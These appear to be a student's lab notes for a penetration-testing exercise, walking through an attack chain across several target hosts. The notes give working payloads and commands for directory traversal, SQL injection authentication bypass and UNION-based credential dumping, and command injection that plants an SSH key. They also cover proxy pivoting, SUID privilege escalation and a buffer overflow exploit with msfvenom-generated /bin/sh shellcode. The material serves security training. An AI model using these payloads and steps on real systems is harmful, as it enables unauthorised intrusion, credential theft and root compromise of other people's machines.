t1: 10.50.14.82 (PublicFacingWebsite)
## Once you gain inital access, do privilege escalation.

## Scan the ip
linops$ nmap <t1>
nc each of the open ports
firefox --> <t1>:80                                                    take note of the various pages with info for phishing, Employee sign in leads to Admin page, and that you uploaded your ssh key

The site shows an input prompt saying File to read: _____(input)       if it says "file to read" it indicates directory traversal (to cat files)
in the input prompt, enter: cd ../../../../../../../etc/passwd         choose /etc/passwd bc every single user on a linux system has the ability to read this
in the input prompt, enter: cd ../../../../../../../etc/hosts          first place to look for the next tgt

<ip>/login.html there are Username and Password input prompts          indicates authentication bypass ( 'OR 1='1 )
<ip>/admin.php there is a Decode String input prompt                   indicates it runs a cmd therefore do cmd injection ( ;whoami )                    

## SSH key upload           do NOT chmod 777 the id_rsa.pub file (ssh is weird about this)
linops$ cat ../../../.ssh/id_rsa.pub                                   copy the contents
in the Decode String input prompt enter                                ; mkdir /var/www/.ssh
in the Decode String input prompt enter                                ; echo "long ass string" > /var/www/.ssh/authorized_keys
in the Decode String input prompt enter                                ; cat /var/www/.ssh/authorized_keys

## Gain initial access
linops$ ssh user@<t1> -p # (make tunnel)
linops$ ssh user@localhost rhp
user@PublicFacingWebsite$ ping <t2>

# Recon/Scanning
user@PublicFacingWebsite$ for i in {1..254} ;do (ping -c 1 192.168.28.$i | grep "bytes from" &) 2>/dev/null ;done                      ping sweep the t2 network (results show t2 & t3)
linops$ set up proxychains -D 9050 to t1
linops$ proxychains nmap <t2>
nc each of the open ports
exit -D 9050

## SQL injection (web exploitation day 2)
linops$ ssh user@<ip> -p # -L rhp:<t2>:<t2port>
firefox --> 127.0.0.1:rhp                                                                           browse through site
identify the vulnerable field using ...?product=7 OR 1=1                                            if its vulnerable it will show more info than its supposed to
?product=7 UNION SELECT table_schema,table_name,column_name from information_schema.columns         use golden statement. find non-default databases, tables, and columns of interest.
information.schema, performance.schema, mysql are the default sql databases. the above cmd is the only thing you need to look at in those databases. look for info in non-default databases.
?product=7 UNION SELECT user_id,name,username from siteusers.users                                  Find creds. if results seem encoded, decode with cyberchef.
Reminder: UNION SELECT column, column, column, FROM database.table

## You arent required to gain inital access to t2, so gain initial access to t3
ssh user@<t2> -p ... (make tunnel)
cat /etc/passwd & /etc/hosts

## Linux Priv Escalation
find / -perm /6000 2>/dev/null               find all files with suid/sgid bit set
search cmds on gtfobins. ONLY look on the SUID/SGID sections.
followed instructions to escalate privileges, then dropped into a bash shell.
for i in {1..254} ;do (ping -c 1 192.168.28.$i | grep "bytes from" &) 2>/dev/null ;done (results showed 192.168.28.189)           run a ping sweep (results show t4)

## Recon/Scanning
linops$ linops$ proxychains nmap <t4>
nc each of the open ports
exit -D 9050

## Gain initial access to t4
linops$ ssh (tunnel through t3 to t4. bc t4 is windows & we'll be connecting via rdp, the tgtport is 3389).
linops$ xfreerdp /u:username /p:password /v:localhost:rhp /cert-ignore

inside task scheduler you'll find the putty.exe running from a non-default location.

## Buffer Overflow using gdb and env (reverse engineering)
DO IT ON THE TGT SYSTEM !!! ALL OF THIS MUST BE DONE ON THE FUCKING TGT SYSTEM !!!
     linops$ gdb exploit_me
     gdb-peda$ run
     go to wiremask generate a pattern with a length of 100
     gdb-peda$ r <long ass pattern>
     find where the EIP value is. it should be the same value as the last line where it says Stopped Reason: SIGSEGV 0x##### in ??(). input that value as the offset value in wiremask website.
     split screen, touch /tmp/exploit.py, chmod 777, then vi /tmp/exploit.py
     urmom = "A" * 55
     eip = "BBBB"
     nop = '\x90' * 5
     print(urmom+eip+nop)
     :w!
     gdb-peda$ run $(python exploit.py)           (if the arguement is immediately after the exe name, then dont use the <<<)
     gdb-peda$ exit. then linops$ env - gdb <exploit_name>
     (gdb) show env
     (gdb) unset env LINES
     (gdb) unset env COLUMNS
     Now that we have the memory layout for this program we need to select a start and end to search through for a "jmp esp". In order to do that we take the start address after the heap and the end address before the stack.
     To search for "jmp esp" run the command: find /b 0xfirstmemaddrafterheap , 0xlastmemaddr, 0xff, 0xe4           The start and end address can be different based on the program and the system that program executes on. The 0xff and 0xef does not change
     This command should return a ton of memory addresses. Choose the 2nd or 3rd memory address and copy it into your exploit code. Remember that we are on a little endian cpu architecture, so hex for the memory address will have to be submitted in reverse.
     add that mem addr into exploit.py as the eip value
     linops$ msfvenom -p linux/x86/exec CMD=/bin/sh -b '\x00' -f python      this will take awhile & will generate a buffer. copy paste it to the end of the script. make sure the script is on the tgt machine. rn the script looks like.
          urmom = "A" * 55
     eip = "\xab\x48\xf6\xf7"
     nop = '\x90' * 32
     buf =  b""
     buf += b"\xba\xb8\x38\xee\xd4\xda\xd4\xd9\x74\x24\xf4\x58"
     buf += b"\x33\xc9\xb1\x0b\x31\x50\x15\x03\x50\x15\x83\xe8"
     buf += b"\xfc\xe2\x4d\x52\xe5\x8c\x34\xf1\x9f\x44\x6b\x95"
     buf += b"\xd6\x72\x1b\x76\x9a\x14\xdb\xe0\x73\x87\xb2\x9e"
     buf += b"\x02\xa4\x16\xb7\x1d\x2b\x96\x47\x31\x49\xff\x29"
     buf += b"\x62\xfe\x97\xb5\x2b\x53\xee\x57\x1e\xd3"

     print(urmom+eip+nop+buf)
     ~                                        
     on the tgt machine: sudo ./exploit_me $(python exploit.py)       then itll show a # if it worked & you can enter whoami & itll show root!!




















